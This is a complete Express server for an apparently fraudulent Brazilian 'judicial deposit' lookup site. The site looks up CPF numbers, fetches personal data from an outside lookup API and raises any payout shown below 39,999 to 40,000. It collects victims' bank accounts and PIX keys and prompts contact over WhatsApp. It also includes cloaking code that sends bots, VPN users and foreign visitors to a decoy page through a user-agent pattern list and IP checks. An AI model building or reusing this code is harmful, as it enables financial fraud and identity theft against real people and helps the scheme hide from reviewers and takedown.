import express from 'express';
import cors from 'cors';
import Database from 'better-sqlite3';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import crypto from 'crypto';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// ID único desta instância para diagnóstico
const INSTANCE_ID = crypto.randomBytes(4).toString('hex');
const INSTANCE_START = new Date().toISOString();
console.log(`[SERVER] Instância ${INSTANCE_ID} iniciada em ${INSTANCE_START}`);

const app = express();
app.use(cors());
app.use(express.json({ limit: '150mb' }));
app.use(express.urlencoded({ limit: '150mb', extended: true }));

// Desabilitar ETag globalmente
app.set('etag', false);

// Desabilitar cache para todas as APIs (incluindo Cloudflare)
app.use('/api', (req, res, next) => {
  // Headers padrão de no-cache
  res.set('Cache-Control', 'private, no-store, no-cache, must-revalidate, max-age=0');
  res.set('Pragma', 'no-cache');
  res.set('Expires', '0');
  // Headers específicos para CDNs/proxies
  res.set('Surrogate-Control', 'no-store');
  res.set('CDN-Cache-Control', 'no-store');
  // Headers específicos para Cloudflare
  res.set('Cloudflare-CDN-Cache-Control', 'no-store');
  // Variação para forçar respostas únicas
  res.set('Vary', '*');
  // ID da instância para diagnóstico
  res.set('X-Instance-ID', INSTANCE_ID);
  res.set('X-Response-Time', new Date().toISOString());
  next();
});

// Usar caminho absoluto para o banco de dados (persistência)
const DB_PATH = process.env.DATABASE_PATH || join(__dirname, 'database.db');
console.log(`[SERVER] Usando banco de dados: ${DB_PATH}`);
const db = new Database(DB_PATH);

// Tabela de acessos
db.exec(`
  CREATE TABLE IF NOT EXISTS acessos (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT,
    cpf_consultado TEXT,
    dispositivo TEXT,
    navegador TEXT,
    pais TEXT,
    cidade TEXT,
    bloqueado INTEGER DEFAULT 0,
    motivo_bloqueio TEXT DEFAULT '',
    is_vpn INTEGER DEFAULT 0,
    is_bot INTEGER DEFAULT 0,
    criado_em DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

// Adicionar colunas se não existirem
try { db.exec("ALTER TABLE acessos ADD COLUMN bloqueado INTEGER DEFAULT 0"); } catch {}
try { db.exec("ALTER TABLE acessos ADD COLUMN motivo_bloqueio TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE acessos ADD COLUMN is_vpn INTEGER DEFAULT 0"); } catch {}
try { db.exec("ALTER TABLE acessos ADD COLUMN is_bot INTEGER DEFAULT 0"); } catch {}

// Tabela de configurações
db.exec(`
  CREATE TABLE IF NOT EXISTS configuracoes (
    chave TEXT PRIMARY KEY,
    valor TEXT
  )
`);

// Tabela de contatos (CPF não encontrado)
db.exec(`
  CREATE TABLE IF NOT EXISTS contatos (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    nome TEXT NOT NULL,
    cpf TEXT NOT NULL,
    telefone TEXT NOT NULL,
    data_nascimento TEXT DEFAULT '',
    criado_em DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

// Inserir configurações padrão se não existirem
const defaultConfigs = [
  ['whatsapp_numero', '5531920047699'],
  ['whatsapp_mensagem', ''],
  ['whatsapp_mensagem_nao_encontrado', 'Olá, meu nome é {nome}, CPF {cpf}, nascido em {data_nascimento}.\n\nO sistema não conseguiu encontrar meu processo! Gostaria de saber mais detalhes para que eu consiga fazer o cadastramento para meu depósito judicial favorável.'],
  ['protecao_ativa', 'true'],
  ['bloquear_vpn', 'true'],
  ['bloquear_fora_brasil', 'true'],
  ['bloquear_bots', 'true'],
  ['whitepage_url', 'https://google.com']
];
for (const [chave, valor] of defaultConfigs) {
  db.prepare('INSERT OR IGNORE INTO configuracoes (chave, valor) VALUES (?, ?)').run(chave, valor);
}

db.exec(`
  CREATE TABLE IF NOT EXISTS processos (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    nome TEXT NOT NULL,
    cpf TEXT NOT NULL,
    numero_processo TEXT NOT NULL,
    advogado TEXT NOT NULL DEFAULT '',
    valor_receber REAL NOT NULL DEFAULT 0,
    valor_pendente REAL NOT NULL DEFAULT 0,
    status TEXT NOT NULL DEFAULT 'Em andamento',
    polo_ativo TEXT DEFAULT '',
    polo_passivo TEXT DEFAULT '',
    cnpj_reu TEXT DEFAULT '',
    vara TEXT DEFAULT '',
    comarca TEXT DEFAULT '',
    classe TEXT DEFAULT '',
    assunto TEXT DEFAULT '',
    jurisdicao TEXT DEFAULT '',
    orgao_julgador TEXT DEFAULT '',
    valor_causa TEXT DEFAULT '',
    autuacao TEXT DEFAULT '',
    segredo_justica TEXT DEFAULT 'NÃO',
    justica_gratuita TEXT DEFAULT 'NÃO',
    tutela_liminar TEXT DEFAULT 'NÃO',
    prioridade TEXT DEFAULT 'NÃO',
    criado_em DATETIME DEFAULT CURRENT_TIMESTAMP,
    atualizado_em DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

// Adicionar colunas se não existirem
try { db.exec("ALTER TABLE processos ADD COLUMN polo_ativo TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN polo_passivo TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN cnpj_reu TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN vara TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN comarca TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN classe TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN assunto TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN jurisdicao TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN orgao_julgador TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN valor_causa TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN autuacao TEXT DEFAULT ''"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN segredo_justica TEXT DEFAULT 'NÃO'"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN justica_gratuita TEXT DEFAULT 'NÃO'"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN tutela_liminar TEXT DEFAULT 'NÃO'"); } catch {}
try { db.exec("ALTER TABLE processos ADD COLUMN prioridade TEXT DEFAULT 'NÃO'"); } catch {}

// Índices para acelerar buscas e verificação de duplicados
try { db.exec("CREATE INDEX IF NOT EXISTS idx_processos_numero ON processos(numero_processo)"); } catch {}
try { db.exec("CREATE INDEX IF NOT EXISTS idx_processos_cpf ON processos(cpf)"); } catch {}

app.get('/api/processos', (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const limit = parseInt(req.query.limit) || 50;
  const search = req.query.search || '';
  const orderBy = req.query.orderBy || 'dados_primeiro';
  const filterDados = req.query.filterDados || '';
  const offset = (page - 1) * limit;

  // Subquery para verificar se tem dados enviados
  const dadosSubquery = `(SELECT COUNT(*) FROM prosseguimentos WHERE REPLACE(REPLACE(REPLACE(prosseguimentos.cpf, '.', ''), '-', ''), ' ', '') = REPLACE(REPLACE(REPLACE(processos.cpf, '.', ''), '-', ''), ' ', ''))`;

  let conditions = [];
  let params = [];

  if (search) {
    conditions.push(`(nome LIKE ? OR cpf LIKE ? OR numero_processo LIKE ? OR polo_ativo LIKE ? OR polo_passivo LIKE ?)`);
    const searchPattern = `%${search}%`;
    params.push(searchPattern, searchPattern, searchPattern, searchPattern, searchPattern);
  }

  if (filterDados === 'com_dados') {
    conditions.push(`${dadosSubquery} > 0`);
  } else if (filterDados === 'sem_dados') {
    conditions.push(`${dadosSubquery} = 0`);
  }

  const whereClause = conditions.length > 0 ? `WHERE ${conditions.join(' AND ')}` : '';

  // Ordenação
  let orderClause;
  switch (orderBy) {
    case 'dados_primeiro':
      orderClause = `ORDER BY ${dadosSubquery} DESC, criado_em DESC`;
      break;
    case 'recente':
      orderClause = 'ORDER BY criado_em DESC';
      break;
    case 'antigo':
      orderClause = 'ORDER BY criado_em ASC';
      break;
    case 'nome_az':
      orderClause = 'ORDER BY nome ASC';
      break;
    case 'nome_za':
      orderClause = 'ORDER BY nome DESC';
      break;
    case 'valor_maior':
      orderClause = 'ORDER BY valor_receber DESC';
      break;
    case 'valor_menor':
      orderClause = 'ORDER BY valor_receber ASC';
      break;
    default:
      orderClause = `ORDER BY ${dadosSubquery} DESC, criado_em DESC`;
  }

  const countQuery = `SELECT COUNT(*) as total FROM processos ${whereClause}`;
  const total = db.prepare(countQuery).get(...params).total;

  const dataQuery = `SELECT processos.*, ${dadosSubquery} as tem_dados FROM processos ${whereClause} ${orderClause} LIMIT ? OFFSET ?`;
  const processos = db.prepare(dataQuery).all(...params, limit, offset);

  // Log para diagnóstico
  console.log(`[${INSTANCE_ID}] GET /api/processos page=${page} total=${total} returned=${processos.length}`);

  res.json({
    data: processos,
    pagination: {
      page,
      limit,
      total,
      totalPages: Math.ceil(total / limit)
    },
    _debug: {
      instance: INSTANCE_ID,
      timestamp: Date.now(),
      dbPath: DB_PATH
    }
  });
});

app.post('/api/processos', (req, res) => {
  const { nome, cpf, numero_processo, advogado, valor_receber, valor_pendente, status, polo_ativo, polo_passivo, vara, comarca, classe, assunto } = req.body;

  if (!nome || !cpf || !numero_processo || !advogado) {
    return res.status(400).json({ error: 'Campos obrigatórios não preenchidos' });
  }

  const stmt = db.prepare(`
    INSERT INTO processos (nome, cpf, numero_processo, advogado, valor_receber, valor_pendente, status, polo_ativo, polo_passivo, vara, comarca, classe, assunto)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `);

  const result = stmt.run(nome, cpf, numero_processo, advogado, valor_receber || 0, valor_pendente || 0, status || 'Em andamento', polo_ativo || '', polo_passivo || '', vara || '', comarca || '', classe || '', assunto || '');
  const processo = db.prepare('SELECT * FROM processos WHERE id = ?').get(result.lastInsertRowid);
  res.status(201).json(processo);
});

app.put('/api/processos/:id', (req, res) => {
  const { id } = req.params;
  const { nome, cpf, numero_processo, advogado, valor_receber, valor_pendente, status, polo_ativo, polo_passivo, vara, comarca, classe, assunto } = req.body;

  const stmt = db.prepare(`
    UPDATE processos SET nome = ?, cpf = ?, numero_processo = ?, advogado = ?, valor_receber = ?, valor_pendente = ?, status = ?, polo_ativo = ?, polo_passivo = ?, vara = ?, comarca = ?, classe = ?, assunto = ?, atualizado_em = CURRENT_TIMESTAMP
    WHERE id = ?
  `);

  stmt.run(nome, cpf, numero_processo, advogado, valor_receber, valor_pendente, status, polo_ativo || '', polo_passivo || '', vara || '', comarca || '', classe || '', assunto || '', id);
  const processo = db.prepare('SELECT * FROM processos WHERE id = ?').get(id);
  res.json(processo);
});

app.delete('/api/processos/:id', (req, res) => {
  db.prepare('DELETE FROM processos WHERE id = ?').run(req.params.id);
  res.json({ success: true });
});

app.get('/api/consulta/:cpf', async (req, res) => {
  try {
    const cpf = req.params.cpf.replace(/\D/g, '');

    if (!cpf || cpf.length !== 11) {
      return res.status(400).json({ error: 'CPF inválido' });
    }

    // Buscar dados pessoais com timeout de 10s (sempre buscar)
    let dadosPessoais = null;
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 10000);
      const apiRes = await fetch(`https://mktsuporte.com.br/apifull.php?cpf=${cpf}`, {
        signal: controller.signal
      });
      clearTimeout(timeout);
      if (apiRes.ok) {
        const text = await apiRes.text();
        if (text && text.trim()) {
          dadosPessoais = JSON.parse(text);
          console.log(`[API] Dados pessoais encontrados para CPF ${cpf}: ${dadosPessoais?.NOME || 'sem nome'}`);
        }
      }
    } catch (err) {
      console.log(`[API] Erro ao buscar dados pessoais para CPF ${cpf}:`, err.message);
    }

    // Buscar processos - usando LIKE para maior compatibilidade
    const processos = db.prepare(`
      SELECT * FROM processos
      WHERE REPLACE(REPLACE(REPLACE(cpf, '.', ''), '-', ''), ' ', '') = ?
    `).all(cpf);

    if (!processos || processos.length === 0) {
      return res.status(404).json({ error: 'Nenhum processo encontrado para este CPF', dadosPessoais });
    }

    // Buscar prosseguimentos
    let prosseguimentos = [];
    try {
      prosseguimentos = db.prepare(`
        SELECT processo_id, cpf, cpf_titular FROM prosseguimentos
        WHERE REPLACE(REPLACE(REPLACE(cpf, '.', ''), '-', ''), ' ', '') = ?
        OR REPLACE(REPLACE(REPLACE(cpf_titular, '.', ''), '-', ''), ' ', '') = ?
      `).all(cpf, cpf);
    } catch (e) {
      console.log('Erro ao buscar prosseguimentos:', e.message);
    }

    const processosComStatus = processos.map(p => {
      // Ajustar valor: se menor que 39999, mostrar como 40000
      const valorOriginal = parseFloat(p.valor_receber) || 0;
      const valorAjustado = valorOriginal < 39999 ? 40000 : valorOriginal;

      return {
        ...p,
        valor_receber: valorAjustado,
        dados_enviados: prosseguimentos.some(pr =>
          pr.processo_id === p.id ||
          pr.cpf?.replace(/\D/g, '') === cpf ||
          pr.cpf_titular?.replace(/\D/g, '') === cpf
        )
      };
    });

    res.json({ processos: processosComStatus, dadosPessoais });
  } catch (error) {
    console.error('Erro na consulta:', error);
    res.status(500).json({ error: 'Erro interno do servidor' });
  }
});

db.exec(`
  CREATE TABLE IF NOT EXISTS prosseguimentos (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    processo_id INTEGER,
    cpf TEXT NOT NULL,
    telefone TEXT NOT NULL,
    banco TEXT NOT NULL,
    agencia TEXT NOT NULL,
    conta TEXT NOT NULL,
    tipo_conta TEXT NOT NULL DEFAULT 'corrente',
    titular TEXT NOT NULL DEFAULT '',
    cpf_titular TEXT NOT NULL DEFAULT '',
    chave_pix TEXT DEFAULT '',
    criado_em DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

app.post('/api/prosseguimento', (req, res) => {
  const { processo_id, cpf, telefone, banco, agencia, conta, tipo_conta, titular, cpf_titular, chave_pix } = req.body;

  if (!cpf || !telefone || !banco || !agencia || !conta || !tipo_conta || !titular || !cpf_titular) {
    res.status(400).json({ error: 'Campos obrigatórios não preenchidos' });
    return;
  }

  const stmt = db.prepare(`
    INSERT INTO prosseguimentos (processo_id, cpf, telefone, banco, agencia, conta, tipo_conta, titular, cpf_titular, chave_pix)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `);

  stmt.run(processo_id || null, cpf, telefone, banco, agencia, conta, tipo_conta, titular, cpf_titular, chave_pix || '');
  res.status(201).json({ success: true });
});

app.get('/api/prosseguimentos', (req, res) => {
  const rows = db.prepare('SELECT * FROM prosseguimentos ORDER BY criado_em DESC').all();
  res.json(rows);
});

app.delete('/api/prosseguimentos/:id', (req, res) => {
  db.prepare('DELETE FROM prosseguimentos WHERE id = ?').run(req.params.id);
  res.json({ success: true });
});

// Endpoints de contatos (CPF não encontrado)
app.post('/api/contato', (req, res) => {
  const { nome, cpf, telefone, data_nascimento } = req.body;

  if (!nome || !cpf || !telefone) {
    return res.status(400).json({ error: 'Campos obrigatórios não preenchidos' });
  }

  const stmt = db.prepare(`
    INSERT INTO contatos (nome, cpf, telefone, data_nascimento)
    VALUES (?, ?, ?, ?)
  `);

  stmt.run(nome, cpf.replace(/\D/g, ''), telefone, data_nascimento || '');
  res.status(201).json({ success: true });
});

app.get('/api/contatos', (req, res) => {
  const rows = db.prepare('SELECT * FROM contatos ORDER BY criado_em DESC').all();
  res.json(rows);
});

app.delete('/api/contatos/:id', (req, res) => {
  db.prepare('DELETE FROM contatos WHERE id = ?').run(req.params.id);
  res.json({ success: true });
});

// Lista de bots conhecidos
const BOT_PATTERNS = [
  /bot/i, /crawler/i, /spider/i, /crawling/i, /feedfetcher/i,
  /slurp/i, /mediapartners/i, /googlebot/i, /bingbot/i, /yandex/i,
  /baiduspider/i, /facebookexternalhit/i, /twitterbot/i, /rogerbot/i,
  /linkedinbot/i, /embedly/i, /quora/i, /pinterest/i, /slackbot/i,
  /vkShare/i, /W3C_Validator/i, /redditbot/i, /applebot/i, /whatsapp/i,
  /flipboard/i, /tumblr/i, /bitlybot/i, /skypeuripreview/i, /nuzzel/i,
  /discordbot/i, /qwantify/i, /pinterestbot/i, /bitrix/i, /xing-contenttabreceiver/i,
  /chrome-lighthouse/i, /telegrambot/i, /integration/i, /phantomjs/i,
  /headless/i, /selenium/i, /webdriver/i, /puppet/i
];

function isBot(userAgent) {
  if (!userAgent) return true;
  return BOT_PATTERNS.some(pattern => pattern.test(userAgent));
}

// Verificar proteção (chamado pelo frontend)
app.post('/api/verificar-acesso', async (req, res) => {
  const userAgent = req.headers['user-agent'] || '';
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '';

  // Buscar configurações
  const configs = {};
  db.prepare('SELECT * FROM configuracoes').all().forEach(c => configs[c.chave] = c.valor);

  const protecaoAtiva = configs.protecao_ativa === 'true';
  const bloquearVpn = configs.bloquear_vpn === 'true';
  const bloquearForaBrasil = configs.bloquear_fora_brasil === 'true';
  const bloquearBots = configs.bloquear_bots === 'true';
  const whitepageUrl = configs.whitepage_url || 'https://google.com';

  // Se proteção desativada, permitir
  if (!protecaoAtiva) {
    return res.json({ allowed: true });
  }

  // Verificar bot
  const ehBot = isBot(userAgent);
  if (bloquearBots && ehBot) {
    return res.json({ allowed: false, reason: 'bot', redirect: whitepageUrl });
  }

  // Verificar IP (VPN e país) usando ip-api.com
  let ipInfo = { country: 'BR', proxy: false, hosting: false };
  try {
    const cleanIp = ip.replace('::ffff:', '');
    if (cleanIp && cleanIp !== '127.0.0.1' && cleanIp !== 'localhost') {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 3000);
      const apiRes = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,countryCode,city,proxy,hosting`, {
        signal: controller.signal
      });
      clearTimeout(timeout);
      if (apiRes.ok) {
        const data = await apiRes.json();
        if (data.status === 'success') {
          ipInfo = data;
        }
      }
    }
  } catch (err) {
    console.log('Erro ao verificar IP:', err.message);
  }

  // Verificar VPN/Proxy
  if (bloquearVpn && (ipInfo.proxy || ipInfo.hosting)) {
    return res.json({ allowed: false, reason: 'vpn', redirect: whitepageUrl, ipInfo });
  }

  // Verificar país
  if (bloquearForaBrasil && ipInfo.countryCode && ipInfo.countryCode !== 'BR') {
    return res.json({ allowed: false, reason: 'pais', redirect: whitepageUrl, ipInfo });
  }

  return res.json({ allowed: true, ipInfo });
});

// Registrar acesso
app.post('/api/acesso', async (req, res) => {
  const { cpf_consultado, dispositivo, navegador, bloqueado, motivo_bloqueio, is_vpn, is_bot, pais, cidade } = req.body;
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || 'Desconhecido';

  const stmt = db.prepare(`
    INSERT INTO acessos (ip, cpf_consultado, dispositivo, navegador, pais, cidade, bloqueado, motivo_bloqueio, is_vpn, is_bot)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `);

  stmt.run(
    ip,
    cpf_consultado || '',
    dispositivo || 'Desconhecido',
    navegador || 'Desconhecido',
    pais || 'Brasil',
    cidade || '',
    bloqueado ? 1 : 0,
    motivo_bloqueio || '',
    is_vpn ? 1 : 0,
    is_bot ? 1 : 0
  );
  res.json({ success: true });
});

// Listar acessos com paginação
app.get('/api/acessos', (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const limit = parseInt(req.query.limit) || 50;
  const offset = (page - 1) * limit;

  const total = db.prepare('SELECT COUNT(*) as total FROM acessos').get().total;
  const acessos = db.prepare('SELECT * FROM acessos ORDER BY criado_em DESC LIMIT ? OFFSET ?').all(limit, offset);

  res.json({
    data: acessos,
    pagination: {
      page,
      limit,
      total,
      totalPages: Math.ceil(total / limit)
    }
  });
});

// Estatísticas de acessos
app.get('/api/acessos/stats', (req, res) => {
  const total = db.prepare('SELECT COUNT(*) as total FROM acessos').get().total;
  const hoje = db.prepare("SELECT COUNT(*) as total FROM acessos WHERE DATE(criado_em) = DATE('now')").get().total;
  const bloqueados = db.prepare("SELECT COUNT(*) as total FROM acessos WHERE bloqueado = 1").get().total;
  const dispositivos = db.prepare('SELECT dispositivo, COUNT(*) as count FROM acessos GROUP BY dispositivo ORDER BY count DESC LIMIT 5').all();

  res.json({ total, hoje, bloqueados, dispositivos });
});

// Obter configurações
app.get('/api/configuracoes', (req, res) => {
  const rows = db.prepare('SELECT * FROM configuracoes').all();
  const config = {};
  for (const row of rows) {
    config[row.chave] = row.valor;
  }
  res.json(config);
});

// Salvar configurações
app.put('/api/configuracoes', (req, res) => {
  const {
    whatsapp_numero,
    whatsapp_mensagem,
    whatsapp_mensagem_nao_encontrado,
    protecao_ativa,
    bloquear_vpn,
    bloquear_fora_brasil,
    bloquear_bots,
    whitepage_url
  } = req.body;

  const stmt = db.prepare('INSERT OR REPLACE INTO configuracoes (chave, valor) VALUES (?, ?)');
  if (whatsapp_numero !== undefined) stmt.run('whatsapp_numero', whatsapp_numero);
  if (whatsapp_mensagem !== undefined) stmt.run('whatsapp_mensagem', whatsapp_mensagem);
  if (whatsapp_mensagem_nao_encontrado !== undefined) stmt.run('whatsapp_mensagem_nao_encontrado', whatsapp_mensagem_nao_encontrado);
  if (protecao_ativa !== undefined) stmt.run('protecao_ativa', protecao_ativa);
  if (bloquear_vpn !== undefined) stmt.run('bloquear_vpn', bloquear_vpn);
  if (bloquear_fora_brasil !== undefined) stmt.run('bloquear_fora_brasil', bloquear_fora_brasil);
  if (bloquear_bots !== undefined) stmt.run('bloquear_bots', bloquear_bots);
  if (whitepage_url !== undefined) stmt.run('whitepage_url', whitepage_url);

  res.json({ success: true });
});

// Importar processos de JSON (incremental - não apaga existentes)
app.post('/api/importar', (req, res) => {
  const { processos } = req.body;

  if (!processos || !Array.isArray(processos)) {
    return res.status(400).json({ error: 'Formato inválido. Esperado array de processos.' });
  }

  // Carregar todos os números de processo existentes em memória (muito mais rápido)
  const existentes = new Set(
    db.prepare('SELECT numero_processo FROM processos').all().map(r => r.numero_processo)
  );

  const insertStmt = db.prepare(`
    INSERT INTO processos (nome, cpf, numero_processo, advogado, valor_receber, valor_pendente, status, polo_ativo, polo_passivo, cnpj_reu, vara, comarca, classe, assunto, jurisdicao, orgao_julgador, valor_causa, autuacao, segredo_justica, justica_gratuita, tutela_liminar, prioridade)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `);

  let importados = 0;
  let duplicados = 0;
  let erros = 0;

  // Usar transação para importação em massa (muito mais rápido)
  const importarTodos = db.transaction(() => {
    for (const p of processos) {
      try {
        // Verificar se já existe (lookup em Set é O(1))
        const numeroProcesso = p.numero_processo || '';
        if (numeroProcesso && existentes.has(numeroProcesso)) {
          duplicados++;
          continue;
        }
        // Marcar como existente para evitar duplicados dentro do mesmo lote
        if (numeroProcesso) existentes.add(numeroProcesso);

        // Limpar nome do autor (remover "Polo ativo" e " -")
        const nomeAutor = (p.nome_autor || '').replace(/^Polo ativo/i, '').replace(/ -$/, '').trim();
        const nomeReu = (p.nome_reu || '').replace(/^Polo passivo/i, '').replace(/ -$/, '').trim();

        // Extrair valor numérico do valor_causa
        const valorCausaNum = parseFloat((p.valor_causa || '0').replace(/[^\d,]/g, '').replace(',', '.')) || 0;

        // Assuntos como string
        const assuntos = Array.isArray(p.assuntos) ? p.assuntos.join(', ') : (p.assunto || '');

        // Polo ativo/passivo do processo_original se existir
        const poloAtivo = p.processo_original?.polo_ativo || nomeAutor;
        const poloPassivo = p.processo_original?.polo_passivo || nomeReu;

        insertStmt.run(
          nomeAutor,                                    // nome
          (p.cpf_autor || '').replace(/\D/g, ''),       // cpf
          numeroProcesso,                               // numero_processo
          '',                                           // advogado
          valorCausaNum,                                // valor_receber
          0,                                            // valor_pendente
          'Em andamento',                               // status
          poloAtivo,                                    // polo_ativo
          poloPassivo,                                  // polo_passivo
          p.cnpj_reu || '',                             // cnpj_reu
          p.orgao_julgador || '',                       // vara (usando orgao_julgador)
          p.jurisdicao || '',                           // comarca (usando jurisdicao)
          p.classe_judicial || p.processo_original?.classe || '', // classe
          assuntos,                                     // assunto
          p.jurisdicao || '',                           // jurisdicao
          p.orgao_julgador || '',                       // orgao_julgador
          p.valor_causa || '',                          // valor_causa (texto original)
          p.autuacao || '',                             // autuacao
          p.segredo_justica || 'NÃO',                   // segredo_justica
          p.justica_gratuita || 'NÃO',                  // justica_gratuita
          p.tutela_liminar || 'NÃO',                    // tutela_liminar
          p.prioridade || 'NÃO'                         // prioridade
        );
        importados++;
      } catch (err) {
        console.error('Erro ao importar processo:', err.message);
        erros++;
      }
    }
  });

  importarTodos();

  res.json({ success: true, importados, duplicados, erros, total: processos.length });
});

// Endpoint de diagnóstico (v2)
app.get('/api/health', (req, res) => {
  console.log(`[${INSTANCE_ID}] GET /api/health`);
  const processosCount = db.prepare('SELECT COUNT(*) as total FROM processos').get().total;
  const prosseguimentosCount = db.prepare('SELECT COUNT(*) as total FROM prosseguimentos').get().total;
  const acessosCount = db.prepare('SELECT COUNT(*) as total FROM acessos').get().total;

  res.json({
    status: 'ok',
    instance: {
      id: INSTANCE_ID,
      startedAt: INSTANCE_START,
      uptime: Math.floor((Date.now() - new Date(INSTANCE_START).getTime()) / 1000) + 's'
    },
    database: {
      path: DB_PATH,
      processos: processosCount,
      prosseguimentos: prosseguimentosCount,
      acessos: acessosCount
    },
    timestamp: new Date().toISOString()
  });
});

// Servir arquivos estáticos do build em produção
app.use(express.static(join(__dirname, '../dist')));

// Fallback para SPA (Express 5 syntax)
app.get('/{*splat}', (req, res) => {
  res.sendFile(join(__dirname, '../dist/index.html'));
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
